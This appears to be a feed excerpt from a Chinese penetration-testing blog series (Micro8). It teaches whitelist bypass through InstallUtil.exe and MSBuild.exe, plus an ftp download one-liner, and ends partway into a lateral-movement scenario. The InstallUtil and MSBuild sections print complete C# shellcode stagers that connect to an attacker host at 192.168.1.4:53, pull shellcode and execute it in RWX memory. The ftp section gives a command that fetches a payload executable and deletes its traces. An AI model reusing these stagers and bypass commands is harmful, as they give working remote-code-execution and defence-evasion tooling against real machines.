        <content type="html"><![CDATA[<h3 id="Installutil简介："><a href="#Installutil简介：" class="headerlink" title="Installutil简介："></a>Installutil简介：</h3><p>Installer工具是一个命令行实用程序，允许您通过执行指定程序集中的安装程序组件来安装和卸载服务器资源。此工具与System.Configuration.Install命名空间中的类一起使用。<br>具体参考：Windows Installer部署<br><a href="https://docs.microsoft.com/zh-cn/previous-versions/2kt85ked(v=vs.120)" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/previous-versions/2kt85ked(v=vs.120)</a></p><p><strong>说明：</strong>Installutil.exe所在路径没有被系统添加PATH环境变量中，因此，Installutil命令无法识别。</p><p>基于白名单installutil.exe配置payload：</p><p>Windows 7 默认位置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe</span><br></pre></td></tr></table></figure><p><strong>攻击机：</strong>192.168.1.4 Debian<br><strong>靶机：</strong>192.168.1.3 Windows 7</p><h3 id="配置攻击机msf："><a href="#配置攻击机msf：" class="headerlink" title="配置攻击机msf："></a>配置攻击机msf：</h3><p><img src="../do/media/dc56fe8b83b82c65150ac6715d296968.jpg" alt></p><h3 id="靶机执行："><a href="#靶机执行：" class="headerlink" title="靶机执行："></a>靶机执行：</h3><h3 id="靶机编译："><a href="#靶机编译：" class="headerlink" title="靶机编译："></a>靶机编译：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /r:System.Ente rpriseServices.dll /r:System.IO.Compression.dll /target:library /out:Mic opoor.exe /keyfile:C:\Users\John\Desktop\installutil.snk /unsafe C:\Users\John\Desktop\installutil.cs</span><br></pre></td></tr></table></figure><p><img src="../do/media/86a0962a09b6e1f14b90d523abc1e0f8.jpg" alt></p><p><strong>payload：</strong><br>Micropoor.exe<br><img src="../do/media/380382cb9c51c0a16a3d13b0b023985a.jpg" alt></p><p><strong>靶机执行：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U Micropoor.exe</span><br></pre></td></tr></table></figure><p><img src="../do/media/8e03a632f426c981eaec67817eea1469.jpg" alt></p><h3 id="附录：Micropoor-cs"><a href="#附录：Micropoor-cs" class="headerlink" title="附录：Micropoor.cs"></a>附录：Micropoor.cs</h3><p><strong>注：x64 payload</strong></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System; <span class="keyword">using</span> System.Net; <span class="keyword">using</span> System.Linq; <span class="keyword">using</span> System.Net.Sockets; <span class="keyword">using</span> System.Runtime.InteropServices; <span class="keyword">using</span> System.Threading; <span class="keyword">using</span> System.Configuration.Install; <span class="keyword">using</span> System.Windows.Forms;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">GQLBigHgUniLuVx</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line"></span><br><span class="line">&#123;&#123; MessageBox.Show(<span class="string">"doge"</span>); Console.ReadLine();&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">[<span class="meta">System.ComponentModel.RunInstaller(true)</span>]</span><br><span class="line"></span><br><span class="line">public class esxWUYUTWShqW : System.Configuration.Install.Installer</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="keyword">void</span> <span class="title">Uninstall</span>(<span class="params">System.Collections.IDictionary zWrdFAUHmunnu</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">jkmhGrfzsKQeCG.LCIUtRN();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">jkmhGrfzsKQeCG</span></span><br><span class="line"></span><br><span class="line">&#123; [DllImport(<span class="string">"kernel32"</span>)] <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">VirtualAlloc</span>(<span class="params">UInt32 YUtHhF,UInt32 VenifEUR, UInt32 NIHbxnOmrgiBGL, UInt32 KIheHEUxhAfOI</span>)</span>;</span><br><span class="line"></span><br><span class="line">[<span class="meta">DllImport(<span class="meta-string">"kernel32"</span>)</span>]<span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">CreateThread</span>(<span class="params">UInt32 GDmElasSZbx, UInt32 rGECFEZG, UInt32 UyBSrAIp,IntPtr sPEeJlufmodo, UInt32 jmzHRQU, <span class="keyword">ref</span> UInt32 SnpQPGMvDbMOGmn</span>)</span>;</span><br><span class="line"></span><br><span class="line">[<span class="meta">DllImport(<span class="meta-string">"kernel32"</span>)</span>] <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">WaitForSingleObject</span>(<span class="params">IntPtr pRIwbzTTS, UInt32 eRLAWWYQnq</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">byte</span>[] <span class="title">ErlgHH</span>(<span class="params"><span class="keyword">string</span> ZwznjBJY, <span class="keyword">int</span> KsMEeo</span>)</span> &#123;</span><br><span class="line"></span><br><span class="line">IPEndPoint qAmSXHOKCbGlysd = <span class="keyword">new</span> IPEndPoint(IPAddress.Parse(ZwznjBJY), KsMEeo);</span><br><span class="line"></span><br><span class="line">Socket XXxIoIXNCle = <span class="keyword">new</span> Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123; XXxIoIXNCle.Connect(qAmSXHOKCbGlysd); &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">catch</span> &#123; <span class="keyword">return</span> <span class="literal">null</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">byte</span>[] UmquAHRnhhpuE = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">XXxIoIXNCle.Receive(UmquAHRnhhpuE, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> kFVRSNnpj = BitConverter.ToInt32(UmquAHRnhhpuE, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">byte</span>[] qaYyFq = <span class="keyword">new</span> <span class="keyword">byte</span>[kFVRSNnpj + <span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> SRCDELibA = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (SRCDELibA &lt; kFVRSNnpj)</span><br><span class="line"></span><br><span class="line">&#123; SRCDELibA += XXxIoIXNCle.Receive(qaYyFq, SRCDELibA + <span class="number">5</span>, (kFVRSNnpj ‐ SRCDELibA) &lt; <span class="number">4096</span> ? (kFVRSNnpj ‐ SRCDELibA) : <span class="number">4096</span>, <span class="number">0</span>);&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">byte</span>[] TvvzOgPLqwcFFv = BitConverter.GetBytes((<span class="keyword">int</span>)XXxIoIXNCle.Handle);</span><br><span class="line"></span><br><span class="line">Array.Copy(TvvzOgPLqwcFFv, <span class="number">0</span>, qaYyFq, <span class="number">1</span>, <span class="number">4</span>); qaYyFq[<span class="number">0</span>] = <span class="number">0xBF</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> qaYyFq;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">cmMtjerv</span>(<span class="params"><span class="keyword">byte</span>[] HEHUjJhkrNS</span>)</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (HEHUjJhkrNS != <span class="literal">null</span>) &#123;</span><br><span class="line"></span><br><span class="line">UInt32 WcpKfU = VirtualAlloc(<span class="number">0</span>, (UInt32)HEHUjJhkrNS.Length, <span class="number">0x1000</span>, <span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">Marshal.Copy(HEHUjJhkrNS, <span class="number">0</span>, (IntPtr)(WcpKfU), HEHUjJhkrNS.Length);</span><br><span class="line"></span><br><span class="line">IntPtr UhxtIFnlOQatrk = IntPtr.Zero;</span><br><span class="line"></span><br><span class="line">UInt32 wdjYKFDCCf = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">IntPtr XVYcQxpp = IntPtr.Zero;</span><br><span class="line"></span><br><span class="line">UhxtIFnlOQatrk = CreateThread(<span class="number">0</span>, <span class="number">0</span>, WcpKfU, XVYcQxpp, <span class="number">0</span>, <span class="keyword">ref</span> wdjYKFDCCf);</span><br><span class="line"></span><br><span class="line">WaitForSingleObject(UhxtIFnlOQatrk, <span class="number">0xFFFFFFFF</span>); &#125;&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">LCIUtRN</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">byte</span>[] IBtCWU = <span class="literal">null</span>; IBtCWU = ErlgHH(<span class="string">"192.168.1.4"</span>, <span class="number">53</span>);</span><br><span class="line"></span><br><span class="line">cmMtjerv(IBtCWU);</span><br><span class="line"></span><br><span class="line">&#125; &#125;</span><br></pre></td></tr></table></figure><blockquote><p>installutil.snk 596B  </p></blockquote><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>71、基于白名单Msbuild.exe执行payload第一季</title>
      <link href="/article/71_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msbuild.exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E4%B8%80%E5%AD%A3.html"/>
      <url>/article/71_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msbuild.exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E4%B8%80%E5%AD%A3.html</url>
      
        <content type="html"><![CDATA[<h3 id="MSBuild简介："><a href="#MSBuild简介：" class="headerlink" title="MSBuild简介："></a>MSBuild简介：</h3><p>MSBuild 是 Microsoft Build Engine 的缩写，代表 Microsoft 和 Visual Studio的新的生成平台。MSBuild在如何处理和生成软件方面是完全透明的，使开发人员能够在未安装Visual Studio的生成实验室环境中组织和生成产品。</p><p>MSBuild 引入了一种新的基于 XML的项目文件格式，这种格式容易理解、易于扩展并且完全受 Microsoft 支持。MSBuild项目文件的格式使开发人员能够充分描述哪些项需要生成，以及如何利用不同的平台和配置生成这些项。</p><p><strong>说明：</strong>Msbuild.exe所在路径没有被系统添加PATH环境变量中，因此，Msbuild命令无法识别。</p><p>基于白名单MSBuild.exe配置payload：</p><p>Windows 7默认位置为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe</span><br></pre></td></tr></table></figure><p><strong>攻击机：</strong>192.168.1.4 Debian<br><strong>靶机：</strong> 192.168.1.3 Windows 7</p><h3 id="靶机执行："><a href="#靶机执行：" class="headerlink" title="靶机执行："></a>靶机执行：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe Micropoor.xml</span><br></pre></td></tr></table></figure><p><img src="../do/media/0dec9e476e8a77edc2e1fa1a43329f76.jpg" alt></p><h3 id="配置攻击机msf："><a href="#配置攻击机msf：" class="headerlink" title="配置攻击机msf："></a>配置攻击机msf：</h3><p><img src="../do/media/57d9f8497cc0fcd01e0d51b5b6dc0e2a.jpg" alt></p><h3 id="附录：Micropoor-xml"><a href="#附录：Micropoor-xml" class="headerlink" title="附录：Micropoor.xml"></a>附录：Micropoor.xml</h3><p><strong>注：x86 payload</strong></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">&lt;Project ToolsVersion=<span class="string">"4.0"</span> xmlns=<span class="string">"http://schemas.microsoft.com/developer/msbuild/2003"</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;!‐‐ C:\Windows\Microsoft.NET\Framework\v4<span class="number">.0</span><span class="number">.30319</span>\msbuild.exe SimpleTasks.csproj Micropoor ‐‐&gt;</span><br><span class="line"></span><br><span class="line">&lt;Target Name=<span class="string">"iJEKHyTEjyCU"</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;xUokfh /&gt;</span><br><span class="line"></span><br><span class="line">&lt;/Target&gt;</span><br><span class="line"></span><br><span class="line">&lt;UsingTask</span><br><span class="line"></span><br><span class="line">TaskName=<span class="string">"xUokfh"</span></span><br><span class="line"></span><br><span class="line">TaskFactory=<span class="string">"CodeTaskFactory"</span></span><br><span class="line"></span><br><span class="line">AssemblyFile=<span class="string">"C:\Windows\Microsoft.Net\Framework\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll"</span> &gt;</span><br><span class="line"></span><br><span class="line">&lt;Task&gt; </span><br><span class="line"></span><br><span class="line">&lt;Code Type=<span class="string">"Class"</span> Language=<span class="string">"cs"</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;![CDATA[</span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> System; <span class="keyword">using</span> System.Net; <span class="keyword">using</span> System.Net.Sockets; <span class="keyword">using</span> System.Linq; <span class="keyword">using</span> System.Runtime.InteropServices; <span class="keyword">using</span> System.Threading; <span class="keyword">using</span> Microsoft.Build.Framework; <span class="keyword">using</span> Microsoft.Build.Utilities;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">xUokfh</span> : <span class="title">Task</span>, <span class="title">ITask</span> &#123;</span><br><span class="line"></span><br><span class="line">[<span class="meta">DllImport(<span class="meta-string">"kernel32"</span>)</span>] <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">VirtualAlloc</span>(<span class="params">UInt32 ogephG,UInt32 fZZrvQ, UInt32 nDfrBaiPvDyeP, UInt32 LWITkrW</span>)</span>;</span><br><span class="line"></span><br><span class="line">[<span class="meta">DllImport(<span class="meta-string">"kernel32"</span>)</span>]<span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">CreateThread</span>(<span class="params">UInt32 qEVoJxknom, UInt32 gZyJBJWYQsnXkWe, UInt32 jyIPELfKQYEVZM,IntPtr adztSHGJiurGO, UInt32 vjSCprCJ, <span class="keyword">ref</span> UInt32 KbPukprMQXUp</span>)</span>;</span><br><span class="line"></span><br><span class="line">[<span class="meta">DllImport(<span class="meta-string">"kernel32"</span>)</span>] <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">WaitForSingleObject</span>(<span class="params">IntPtr wVCIQGmqjONiM, UInt32 DFgVrE</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">byte</span>[] <span class="title">VYcZlUehuq</span>(<span class="params"><span class="keyword">string</span> IJBRrBqhigjGAx, <span class="keyword">int</span> XBUCexXIrGIEpe</span>)</span> &#123;</span><br><span class="line"></span><br><span class="line">IPEndPoint DRHsPzS = <span class="keyword">new</span> IPEndPoint(IPAddress.Parse(IJBRrBqhigjGAx), XBUCexXIrGIEpe);</span><br><span class="line"></span><br><span class="line">Socket zCoDOd = <span class="keyword">new</span> Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123; zCoDOd.Connect(DRHsPzS); &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">catch</span> &#123; <span class="keyword">return</span> <span class="literal">null</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">byte</span>[] OCrGofbbWRVsFEl = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">zCoDOd.Receive(OCrGofbbWRVsFEl, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> auQJTjyxYw = BitConverter.ToInt32(OCrGofbbWRVsFEl, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">byte</span>[] MlhacMDOKUAfvMX = <span class="keyword">new</span> <span class="keyword">byte</span>[auQJTjyxYw + <span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> GFtbdD = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (GFtbdD &lt; auQJTjyxYw)</span><br><span class="line"></span><br><span class="line">&#123; GFtbdD += zCoDOd.Receive(MlhacMDOKUAfvMX, GFtbdD + <span class="number">5</span>, (auQJTjyxYw ‐ GFtbdD) &lt; <span class="number">4096</span> ? (auQJTjyxYw ‐ GFtbdD) : <span class="number">4096</span>, <span class="number">0</span>);&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">byte</span>[] YqBRpsmDUT = BitConverter.GetBytes((<span class="keyword">int</span>)zCoDOd.Handle);</span><br><span class="line"></span><br><span class="line">Array.Copy(YqBRpsmDUT, <span class="number">0</span>, MlhacMDOKUAfvMX, <span class="number">1</span>, <span class="number">4</span>); MlhacMDOKUAfvMX[<span class="number">0</span>] = <span class="number">0xBF</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> MlhacMDOKUAfvMX;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">NkoqFHncrcX</span>(<span class="params"><span class="keyword">byte</span>[] qLAvbAtan</span>)</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (qLAvbAtan != <span class="literal">null</span>) &#123;</span><br><span class="line"></span><br><span class="line">UInt32 jrYMBRkOAnqTqx = VirtualAlloc(<span class="number">0</span>, (UInt32)qLAvbAtan.Length, <span class="number">0x1000</span>, <span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">Marshal.Copy(qLAvbAtan, <span class="number">0</span>, (IntPtr)(jrYMBRkOAnqTqx), qLAvbAtan.Length);</span><br><span class="line"></span><br><span class="line">IntPtr WCUZoviZi = IntPtr.Zero;</span><br><span class="line"></span><br><span class="line">UInt32 JhtJOypMKo = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">IntPtr UxebOmhhPw = IntPtr.Zero;</span><br><span class="line"></span><br><span class="line">WCUZoviZi = CreateThread(<span class="number">0</span>, <span class="number">0</span>, jrYMBRkOAnqTqx, UxebOmhhPw, <span class="number">0</span>, <span class="keyword">ref</span> JhtJOypMKo);</span><br><span class="line"></span><br><span class="line">WaitForSingleObject(WCUZoviZi, <span class="number">0xFFFFFFFF</span>); &#125;&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="keyword">bool</span> <span class="title">Execute</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">byte</span>[] uABVbNXmhr = <span class="literal">null</span>; uABVbNXmhr = VYcZlUehuq(<span class="string">"192.168.1.4"</span>, <span class="number">53</span>);</span><br><span class="line"></span><br><span class="line">NkoqFHncrcX(uABVbNXmhr); </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>; &#125; &#125;</span><br><span class="line"></span><br><span class="line">]]&gt;</span><br><span class="line"></span><br><span class="line">&lt;/Code&gt;</span><br><span class="line"></span><br><span class="line">&lt;/Task&gt;</span><br><span class="line"></span><br><span class="line">&lt;/UsingTask&gt;</span><br><span class="line"></span><br><span class="line">&lt;/Project&gt;</span><br></pre></td></tr></table></figure><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>70、ftp一句话下载payload补充</title>
      <link href="/article/70_ftp%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload%E8%A1%A5%E5%85%85.html"/>
      <url>/article/70_ftp%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload%E8%A1%A5%E5%85%85.html</url>
      
        <content type="html"><![CDATA[<p><strong>windows 全平台自带ftp，在实战中需要考虑两点。</strong>  </p><ul><li>数据传输的完整性。  </li><li>代码得精简</li></ul><p>本季作为第四十课的补充，一句话下载更为精简。更符合于实战。</p><p><strong>靶机：</strong><br>192.168.1.119  </p><p><strong>demo下载文件为：</strong><br>bin_tcp_x86_53.exe<br><img src="../do/media/a0c59424cccd7240a929a043c65a10d1.jpg" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo open 127.0.0.1 &gt; o&amp;echo user 123 123 &gt;&gt; o &amp;echo get bin_tcp_x86_53.exe &gt;&gt; o &amp;echo quit &gt;&gt; o &amp;ftp ‐n ‐s:o &amp;del /F /Q o</span><br></pre></td></tr></table></figure><p><img src="../do/media/3f470da4395e76cac4553c1c7081a718.jpg" alt></p><p>缩短一句话下载：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo open 127.0.0.1 &gt; o&amp;echo get bin_tcp_x86_53.exe &gt;&gt; o &amp;echo quit &gt;&gt; o &amp;ftp ‐A ‐n ‐s:o &amp;del /F /Q o</span><br></pre></td></tr></table></figure><p><img src="../do/media/b4b18ed037915cf463987e9a1bd3ba9c.jpg" alt></p><p><img src="../do/media/bf3ffa7da2f7737d7b8f4be920d3b143.jpg" alt></p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>69、渗透-持续渗透-后渗透的本质</title>
      <link href="/article/69_%E6%B8%97%E9%80%8F-%E6%8C%81%E7%BB%AD%E6%B8%97%E9%80%8F-%E5%90%8E%E6%B8%97%E9%80%8F%E7%9A%84%E6%9C%AC%E8%B4%A8.html"/>
      <url>/article/69_%E6%B8%97%E9%80%8F-%E6%8C%81%E7%BB%AD%E6%B8%97%E9%80%8F-%E5%90%8E%E6%B8%97%E9%80%8F%E7%9A%84%E6%9C%AC%E8%B4%A8.html</url>
      
        <content type="html"><![CDATA[<h3 id="引言（1）："><a href="#引言（1）：" class="headerlink" title="引言（1）："></a>引言（1）：</h3><p><strong>目标资产信息搜集的广度，决定渗透过程的复杂程度。<br>目标主机信息搜集的深度，决定后渗透权限持续把控。<br>渗透的本质是信息搜集，而信息搜集整理为后续的情报跟进提供了强大的保证。<br>持续渗透的本质是线索关联，而线索关联为后续的攻击链方提供了强大的方向。<br>后渗透的本质是权限把控，而权限把控为后渗透提供了以牺牲时间换取空间强大基础。</strong></p><p><strong>靶机背景介绍：</strong><br><img src="../do/media/eb0714612b4e03133ba10e14ef174b4c.jpg" alt></p><ul><li>主机A1：CentOs x64 全补丁，无提权漏洞，可互联网  </li><li>主机A2：Windows 2008 x64 全补丁 无提权漏洞，脱网机  </li><li>主机B： Windows 2008 x64 全补丁 无提权漏洞，域内主机，脱网机  </li><li>主机C： Windows 2008 x64 域控，存在ms14-068漏洞，脱网机  </li><li>且A1，A2，B,C系统主机密码均为强口令</li></ul><blockquote><p>  A1，A2，B,C为标准ABC类网，允许访问流程，A1—-&gt;A2—-&gt;B—-&gt;C，不允许跨主机访问。<br>  （请注意每个主机的对应IP段）</p></blockquote><p><strong>整体攻击流程图：</strong><br><img src="../do/media/0e9ff50f2d0823e678528868b243ccce.jpg" alt></p><p><strong>模拟开始攻击：</strong>  </p><ul><li><p>扫描主机A1对攻击机开放端口：80,22<br><img src="../do/media/fad85d3505b5e71286df9d301f167de2.jpg" alt></p></li><li><p>扫描主机A1-Web目录结构：<br><img src="../do/media/813af1b732caf9c0adce3dade376694f.jpg" alt></p></li><li><p>主机A1-Web搜索处存在sql注入：<br><img src="../do/media/9a59cdceb1ea09a49a82f81eb778003b.jpg" alt></p></li><li><p>登录后台得到shell：<br><img src="../do/media/ad06e8c45d69e5e450aa3c379ef04eee.jpg" alt></p></li><li><p>生成tcp payload 以php一句话执行：<br><img src="../do/media/89c0851c3482a55632b708c5bce2ad18.jpg" alt>  </p></li></ul><p><img 